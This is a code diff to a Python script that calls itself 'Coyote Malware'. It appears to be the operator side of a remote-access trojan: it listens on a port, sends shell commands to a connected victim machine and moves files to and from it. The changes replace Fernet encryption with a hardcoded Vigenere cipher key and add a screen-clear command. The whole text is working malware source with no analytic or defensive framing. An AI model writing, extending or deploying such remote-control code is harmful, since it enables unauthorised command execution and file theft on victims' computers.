@@ -1,8 +1,9 @@
 #-*-coding: utf-8-*-
 from socket import socket, AF_INET, SOCK_STREAM
-from cryptography.fernet import Fernet as fern
+from crypt import Vigenere as v
 from optparse import OptionParser as op
 from time import sleep
+from os import system
 from sys import argv
 
 class Coyote:
@@ -10,7 +11,7 @@ class Coyote:
         if(printing):
             print("Starting Coyote Malware...");
         self.conn = 0;
-        #self.f = fern(key);
+        self.v = v(key);
         self.sock = socket(AF_INET, SOCK_STREAM);
         self.sock.bind(('0.0.0.0', port));
         self.sock.listen(1);
@@ -29,22 +30,24 @@ class Coyote:
                 self.getFile(cmd[4:]);
             elif(cmd[:4] == "send"):
                 self.sendFile(cmd[5:]);
+            elif cmd == "cls":
+                system("cls");
             else:
                 self.send(cmd, encrypt=False);
                 self.recv(decrypt=False, b=2048);
         self.conn.close();
 
     def send(self, msj, encrypt=True):
+        if(encrypt):
+            msj = self.v.encrypt(msj);
         if(type(msj) != type(b"byte")):
             msj = str(msj).encode();
-        if(encrypt):
-            msj = self.f.encrypt(msj);
         self.conn.send(msj);
     def getFile(self, file):
         with open(file, "wb") as f:
             try:
                 self.conn.settimeout(10);
-                content = self.recv(decode=False, decrypt=False, b=10240);
+                content = self.recv(decode=False, decrypt=True, b=10240);
             except Exception as e:
                 print(e);
             else:
@@ -67,7 +70,7 @@ class Coyote:
             return 0;
         else:
             if(decrypt):
-                msj = self.f.decrypt(msj);
+                msj = self.v.decrypt(msj.decode()).encode();
             if(decode):
                 msj = msj.decode();
             if(prnt):
@@ -77,7 +80,7 @@ class Coyote:
 
 
 def main():
-    c = Coyote(5000, b"dgjVmVHUY_0GlJ2t8aHX5YfacfGkQcLlcIREQ9nPd7U=");
+    c = Coyote(5000,"eajlkwbcpqynvhigdrzotusfmx");
     c.shell();
 
 if __name__ == '__main__':
